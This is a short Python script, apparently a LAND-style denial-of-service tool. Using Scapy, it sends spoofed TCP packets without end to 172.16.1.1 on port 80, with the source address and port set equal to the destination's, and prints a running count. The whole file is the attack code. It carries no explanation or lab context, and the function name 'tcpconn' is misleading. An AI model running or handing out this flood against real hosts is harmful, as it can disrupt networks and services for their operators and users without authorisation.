from scapy.all import *
def tcpconn(packet):
    sendp(packet)

eth = Ether()
ip = IP()
ip.dst = "172.16.1.1"
tcp = TCP()
tcp.dport = 80

m=0
while True:
    ip.src = ip.dst
    tcp.sport = tcp.dport
    packet = eth/ip/tcp
    tcpconn(packet)
    print("sending packetto %s" %ip.dst + 'port Is %s'%tcp.dport)
    m = m+1
    print(m)